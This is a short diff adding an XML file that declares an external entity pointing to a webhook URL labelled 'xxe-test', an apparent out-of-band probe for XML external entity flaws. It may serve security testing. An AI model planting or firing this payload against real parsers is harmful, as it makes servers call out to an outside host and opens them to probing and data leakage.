@@ -1,0 +1,5 @@
+<?xml version="1.0"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "https://webhooksite.net/857089a0-16ce-4f14-b953-b577a9a6f9cc/xxe-test">
+]>
+<data>&xxe;</data>
